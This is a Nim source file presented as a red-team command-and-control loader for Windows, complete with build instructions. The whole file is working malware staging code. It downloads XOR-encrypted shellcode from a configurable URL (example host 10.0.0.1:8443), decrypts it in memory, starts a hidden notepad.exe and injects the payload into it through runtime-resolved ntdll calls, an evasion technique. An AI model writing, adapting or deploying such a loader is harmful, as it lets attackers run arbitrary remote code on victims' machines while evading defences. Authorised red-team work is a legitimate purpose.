## REDTEAM C2 — Nim WinHTTP shellcode loader
## Downloads XOR-encrypted shellcode, decrypts in-memory, injects into notepad.exe via ntdll.
##
## Compile-time constants (required):
##   -d:payloadUrl=https://host/path.bin
##   -d:xorKey=deadbeef...   (hex string, e.g. 16-byte key = 32 hex chars)
##
## Build:
##   nim c -d:mingw -d:strip -d:danger --opt:size \
##         -d:payloadUrl="https://10.0.0.1:8443/sc.bin" \
##         -d:xorKey="aabbccdd11223344" \
##         --app:gui -o:loader_nim.exe loader.nim

import strutils

# ── Compile-time constants ────────────────────────────────────────────────────

const PayloadUrl* {.strdefine.} = ""
const XorKey*     {.strdefine.} = ""

static:
  when PayloadUrl == "":
    {.error: "payloadUrl must be set via -d:payloadUrl=...".}
  when XorKey == "":
    {.error: "xorKey must be set via -d:xorKey=...".}

# ── Windows type / constant definitions ──────────────────────────────────────

type
  HANDLE    = int
  DWORD     = uint32
  BOOL      = int32
  LPVOID    = pointer
  LPCVOID   = pointer
  LPCWSTR   = ptr uint16
  LPCSTR    = cstring
  ULONG_PTR = uint

  HINTERNET = HANDLE

const
  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*    = DWORD(0)
  WINHTTP_FLAG_SECURE*                  = DWORD(0x00800000)

  MEM_COMMIT*   = DWORD(0x1000)
  MEM_RESERVE*  = DWORD(0x2000)
  PAGE_READWRITE*       = DWORD(0x04)
  PAGE_EXECUTE_READ*    = DWORD(0x20)

  CREATE_NO_WINDOW*          = DWORD(0x08000000)
  CREATE_BREAKAWAY_FROM_JOB* = DWORD(0x01000000)

# ── WinHTTP imports ───────────────────────────────────────────────────────────

proc WinHttpOpen(
  pszAgentW:       LPCWSTR,
  dwAccessType:    DWORD,
  pszProxyW:       LPCWSTR,
  pszProxyBypassW: LPCWSTR,
  dwFlags:         DWORD
): HINTERNET {.importc: "WinHttpOpen", dynlib: "winhttp.dll", stdcall.}

proc WinHttpConnect(
  hSession:        HINTERNET,
  pswzServerName:  LPCWSTR,
  nServerPort:     uint16,
  dwReserved:      DWORD
): HINTERNET {.importc: "WinHttpConnect", dynlib: "winhttp.dll", stdcall.}

proc WinHttpOpenRequest(
  hConnect:        HINTERNET,
  pwszVerb:        LPCWSTR,
  pwszObjectName:  LPCWSTR,
  pwszVersion:     LPCWSTR,
  pwszReferrer:    LPCWSTR,
  ppwszAcceptTypes: ptr LPCWSTR,
  dwFlags:         DWORD
): HINTERNET {.importc: "WinHttpOpenRequest", dynlib: "winhttp.dll", stdcall.}

proc WinHttpSendRequest(
  hRequest:        HINTERNET,
  lpszHeaders:     LPCWSTR,
  dwHeadersLength: DWORD,
  lpOptional:      LPVOID,
  dwOptionalLength: DWORD,
  dwTotalLength:   DWORD,
  dwContext:       ULONG_PTR
): BOOL {.importc: "WinHttpSendRequest", dynlib: "winhttp.dll", stdcall.}

proc WinHttpReceiveResponse(
  hRequest: HINTERNET,
  lpReserved: LPVOID
): BOOL {.importc: "WinHttpReceiveResponse", dynlib: "winhttp.dll", stdcall.}

proc WinHttpReadData(
  hRequest:        HINTERNET,
  lpBuffer:        LPVOID,
  dwNumberOfBytesToRead: DWORD,
  lpdwNumberOfBytesRead: ptr DWORD
): BOOL {.importc: "WinHttpReadData", dynlib: "winhttp.dll", stdcall.}

proc WinHttpCloseHandle(
  hInternet: HINTERNET
): BOOL {.importc: "WinHttpCloseHandle", dynlib: "winhttp.dll", stdcall.}

# ── kernel32 imports ──────────────────────────────────────────────────────────

proc CreateProcessA(
  lpApplicationName:    cstring,
  lpCommandLine:        cstring,
  lpProcessAttributes:  pointer,
  lpThreadAttributes:   pointer,
  bInheritHandles:      BOOL,
  dwCreationFlags:      DWORD,
  lpEnvironment:        pointer,
  lpCurrentDirectory:   cstring,
  lpStartupInfo:        pointer,
  lpProcessInformation: pointer
): BOOL {.importc: "CreateProcessA", dynlib: "kernel32.dll", stdcall.}

proc Sleep(dwMilliseconds: DWORD) {.importc: "Sleep", dynlib: "kernel32.dll", stdcall.}

proc CloseHandle(hObject: HANDLE): BOOL {.importc: "CloseHandle", dynlib: "kernel32.dll", stdcall.}

proc GetModuleHandleA(lpModuleName: cstring): HANDLE {.importc: "GetModuleHandleA", dynlib: "kernel32.dll", stdcall.}

proc GetProcAddress(hModule: HANDLE, lpProcName: cstring): pointer {.importc: "GetProcAddress", dynlib: "kernel32.dll", stdcall.}

# ── ntdll proc types (resolved at runtime via GetProcAddress) ─────────────────

type
  NtAllocVMFn   = proc(ph: HANDLE, ba: ptr pointer, zb: uint, sz: ptr uint, at: DWORD, pr: DWORD): int32 {.stdcall.}
  NtWriteVMFn   = proc(ph: HANDLE, ba: pointer, buf: pointer, cnt: uint32, wb: ptr uint32): int32 {.stdcall.}
  NtProtVMFn    = proc(ph: HANDLE, ba: ptr pointer, sz: ptr uint, np: DWORD, op: ptr DWORD): int32 {.stdcall.}
  RtlCreateUTFn = proc(ph: HANDLE, sd: pointer, sus: int32, szb: uint32, stres: pointer, stcom: pointer, sa: pointer, sp: pointer, th: ptr HANDLE, ci: pointer): int32 {.stdcall.}

# ── URL parsing helper ────────────────────────────────────────────────────────

type ParsedUrl = object
  scheme: string
  host:   string
  port:   uint16
  path:   string

proc parseUrl(raw: string): ParsedUrl =
  var s = raw
  result.scheme = "http"
  result.port = 80
  result.path = "/"

  if s.startsWith("https://"):
    result.scheme = "https"
    result.port = 443
    s = s[8..^1]
  elif s.startsWith("http://"):
    s = s[7..^1]

  let slashIdx = s.find('/')
  var hostPart: string
  if slashIdx < 0:
    hostPart = s
    result.path = "/"
  else:
    hostPart = s[0..slashIdx-1]
    result.path = s[slashIdx..^1]

  let colonIdx = hostPart.rfind(':')
  if colonIdx > 0:
    result.host = hostPart[0..colonIdx-1]
    try:
      result.port = uint16(parseInt(hostPart[colonIdx+1..^1]))
    except:
      discard
  else:
    result.host = hostPart

# ── Hex decode helper ─────────────────────────────────────────────────────────

proc fromHex(s: string): seq[byte] =
  let n = s.len div 2
  result = newSeq[byte](n)
  for i in 0..<n:
    result[i] = byte(parseHexInt(s[i*2 .. i*2+1]))

# ── Wide string helper ────────────────────────────────────────────────────────

proc toWide(s: string): seq[uint16] =
  result = newSeq[uint16](s.len + 1)
  for i, c in s:
    result[i] = uint16(ord(c))
  result[s.len] = 0

template wptr(ws: seq[uint16]): LPCWSTR =
  cast[LPCWSTR](unsafeAddr ws[0])

# ── Download via WinHTTP ──────────────────────────────────────────────────────

proc downloadShellcode(url: string): seq[byte] =
  let parsed = parseUrl(url)

  let wAgent  = toWide("Mozilla/5.0")
  let wHost   = toWide(parsed.host)
  let wVerb   = toWide("GET")
  let wPath   = toWide(parsed.path)

  let isHttps = parsed.scheme == "https"

  let hSession = WinHttpOpen(wptr(wAgent), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nil, nil, 0)
  if hSession == 0: return @[]
  defer: discard WinHttpCloseHandle(hSession)

  let hConnect = WinHttpConnect(hSession, wptr(wHost), parsed.port, 0)
  if hConnect == 0: return @[]
  defer: discard WinHttpCloseHandle(hConnect)

  let reqFlags = if isHttps: WINHTTP_FLAG_SECURE else: DWORD(0)
  let hRequest = WinHttpOpenRequest(hConnect, wptr(wVerb), wptr(wPath), nil, nil, nil, reqFlags)
  if hRequest == 0: return @[]
  defer: discard WinHttpCloseHandle(hRequest)

  if WinHttpSendRequest(hRequest, nil, 0, nil, 0, 0, 0) == 0: return @[]
  if WinHttpReceiveResponse(hRequest, nil) == 0: return @[]

  const chunkSize = 65536
  var buf = newSeq[byte](chunkSize)
  while true:
    var bytesRead: DWORD = 0
    if WinHttpReadData(hRequest, addr buf[0], chunkSize, addr bytesRead) == 0: break
    if bytesRead == 0: break
    result.add(buf[0..bytesRead-1])

# ── XOR decrypt ──────────────────────────────────────────────────────────────

proc xorDecrypt(data: var seq[byte]; key: seq[byte]) =
  let klen = key.len
  if klen == 0: return
  for i in 0..<data.len:
    data[i] = data[i] xor key[i mod klen]

# ── Process injection via ntdll (notepad.exe host process) ───────────────────

proc injectAndExec(sc: seq[byte]) =
  if sc.len == 0: return

  # STARTUPINFOA is 104 bytes on Win64; PROCESS_INFORMATION is 24 bytes
  var si: array[104, byte]
  var pi: array[24, byte]
  cast[ptr uint32](addr si[0])[] = 104  # cb = sizeof(STARTUPINFOA)

  let notepad = "C:\\Windows\\System32\\notepad.exe"
  var ok = CreateProcessA(notepad.cstring, nil, nil, nil, 0,
                          CREATE_NO_WINDOW or CREATE_BREAKAWAY_FROM_JOB,
                          nil, nil, addr si[0], addr pi[0])
  if ok == 0:
    ok = CreateProcessA(notepad.cstring, nil, nil, nil, 0,
                        CREATE_NO_WINDOW, nil, nil, addr si[0], addr pi[0])
  if ok == 0: return
  Sleep(500)

  let hProcess = cast[ptr HANDLE](addr pi[0])[]
  let hThread  = cast[ptr HANDLE](addr pi[8])[]

  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll == 0:
    discard CloseHandle(hProcess); discard CloseHandle(hThread); return

  let ntAlloc = cast[NtAllocVMFn](GetProcAddress(ntdll, "NtAllocateVirtualMemory"))
  let ntWrite = cast[NtWriteVMFn](GetProcAddress(ntdll, "NtWriteVirtualMemory"))
  let ntProt  = cast[NtProtVMFn](GetProcAddress(ntdll, "NtProtectVirtualMemory"))
  let rtlUT   = cast[RtlCreateUTFn](GetProcAddress(ntdll, "RtlCreateUserThread"))
  if ntAlloc == nil or ntWrite == nil or ntProt == nil or rtlUT == nil:
    discard CloseHandle(hProcess); discard CloseHandle(hThread); return

  # Allocate RW in remote process
  var remoteAddr: pointer = nil
  var sz: uint = uint(sc.len)
  discard ntAlloc(hProcess, addr remoteAddr, 0, addr sz, uint32(MEM_COMMIT or MEM_RESERVE), uint32(PAGE_READWRITE))
  if remoteAddr == nil:
    discard CloseHandle(hProcess); discard CloseHandle(hThread); return

  # Write shellcode
  var wb: uint32 = 0
  discard ntWrite(hProcess, remoteAddr, unsafeAddr sc[0], uint32(sc.len), addr wb)

  # Flip to RX — sz is page-aligned from NtAllocateVirtualMemory, use it directly
  var oldProt: DWORD = 0
  discard ntProt(hProcess, addr remoteAddr, addr sz, uint32(PAGE_EXECUTE_READ), addr oldProt)

  # Spawn remote thread — agent runs in notepad.exe independently
  var hRemoteThread: HANDLE = 0
  discard rtlUT(hProcess, nil, 0, 0, nil, nil, remoteAddr, nil, addr hRemoteThread, nil)
  if hRemoteThread != 0: discard CloseHandle(hRemoteThread)
  discard CloseHandle(hProcess)
  discard CloseHandle(hThread)

# ── Entry point ───────────────────────────────────────────────────────────────

proc main() =
  var sc = downloadShellcode(PayloadUrl)
  if sc.len == 0: return

  let key = fromHex(XorKey)
  xorDecrypt(sc, key)

  injectAndExec(sc)

when isMainModule:
  main()
